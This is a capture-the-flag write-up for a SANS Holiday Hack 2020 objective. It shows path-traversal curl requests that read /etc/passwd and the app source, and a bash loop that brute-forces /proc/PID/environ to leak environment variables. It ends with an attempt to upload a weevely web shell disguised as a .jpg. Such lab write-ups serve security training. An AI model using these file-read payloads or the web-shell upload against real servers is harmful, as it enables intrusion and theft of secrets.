# Objective 8 – Broken Tag Generator #

## OBJECTIVE: ##
>Help Noel Boetie fix the Tag Generator in the Wrapping Room. What value is in the environment variable `GREETZ`? Talk to Holly Evergreen in the kitchen for help with this.
#  

## HINTS ##
<details>
  <summary>Hints provided for Objective 8</summary>
 
>-	**HOLLY EVERGREEN:** If you find a way to execute code blindly, I bet you can redirect to a file then download that file!
>-	**HOLLY EVERGREEN:** We might be able to find the problem if we can get source code!
>-	**HOLLY EVERGREEN:** Once you know the path to the file, we need a way to download it!
>-	**HOLLY EVERGREEN:** Can you figure out the path to the script? It's probably on error pages!
>-	**HOLLY EVERGREEN:** If you're having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!
>-	**HOLLY EVERGREEN:** Is there an endpoint that will print arbitrary files?
>-	**HOLLY EVERGREEN:** I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?
>-	**HOLLY EVERGREEN:** Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!


</details>

#  
## PROCEDURE: ##
Holly Evergreen and Noel Boetie both seem to think the problem is related to the **file upload** feature of the tag generator – so let’s start by looking at that.

If we upload an image and look at the network events in the Firefox console, we see that the image file is renamed and is stored at a URI that looks similar to ``https://tag-generator.kringlecastle.com/image?id=f3870e1f-7f10-49c1-a84f-1a11c7ed71b1.jpg``  This looks like it might be vulnerable to LFI?

Sure enough – it is! I try ``# curl https://tag-generator.kringlecastle.com/image?id=../../../../../../../../etc/passwd`` and I have the contents of the `passwd` file – that must be a step in the right direction 😊
![image](https://github.com/beta-j/SANS-Holiday-Hack-Challenge-2020/assets/60655500/5bba3621-6c27-4ea4-bbdc-69da90a9d15a)

If I try to upload a script file (eg. php) to the tag generator I get an error message:
```
Error in /app/lib/app.rb: Unsupported file type: /tmp/RackMultipart20201231-1-1m1x12e.php 
```

So this tells me that the uploaded files are being processed by a Ruby application called `app.rb` stored in the `/app/lib` sub-directory
Ok... so let’s try to curl into the script:
```
curl https://tag-generator.kringlecastle.com/image?id=../../../../../../../../app/lib/app.rb
```
We now have accss to the script’s code!

Looking at the code it looks like it’s actually intended to support uploading and extracting zip files so maybe we can upload a payload as zip?  It also looks like the script looks for a file with a .jpg, .jpeg or .png extension once it is uncompressed.

For some reason the check for invalid characters in the filename is commented out – this is probably a hint.
I also note that extracted files are being saved to `#{ TMP_FOLDER }/#{ entry.name }` from the declarations at the start of the Ruby script I can also tell that the `TMP_FOLDER` is referring to the `/tmp/ direcotry`.

Google tells us that Ruby environment variables are stored in `/proc/PID/environ` – but how do I find out the PID?  I’m sure there’s a smart way to go about this but I decided to bruteforce it usign a quick bash script
```
#!/bin/bash
for ((i=0; i<=32768; i++))
do
  echo $i
  curl https://tag-generator.kringlecastle.com/image?id=../../../../proc/$i/environ
done
```

I ran the script and piped the output tot a text file and left for a five hour long New Year’s Day lunch
```
./tagscript.sh >> tagoutput.txt
```

On my return I looked at the contents of `tagoutput.txt` and realise that I hit a match with the 7th try and that PIDs `7` to `26` all gave valid outputs  (so maybe brute force was the right way to go in this case after all).
```
PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app8
```
And there it is – plain as day:  **`GREETZ=JackFrostWasHere`**

### Note ###
I have a hunch that this webapp can also be compromised by remote code execution (RCE).  So I create a payload in `weevely` ending with a .jpg extension:
```
weevely generate pwnage /root/uploadmeplease.jpg
```
I compress this ‘.jpg’ as a zip file and upload it to the tag generator.

Now I should be able to find `uploadmeplease.jpg` in the `/tmp/` directory.  And sure enough, running ``curl https://tag-generator.kringlecastle.com/image?id=../tmp/uploadmeplease.jpg`` shows me the php script – muahahaha.

Although I thought it would be plain sailing from here on out, unfortunately I got stuck – although `curl` requests show me the contents of the php script, normal https requests in a browsers return a 404 error and so does trying to establish a weevely session.

I must be missing something really simple here.
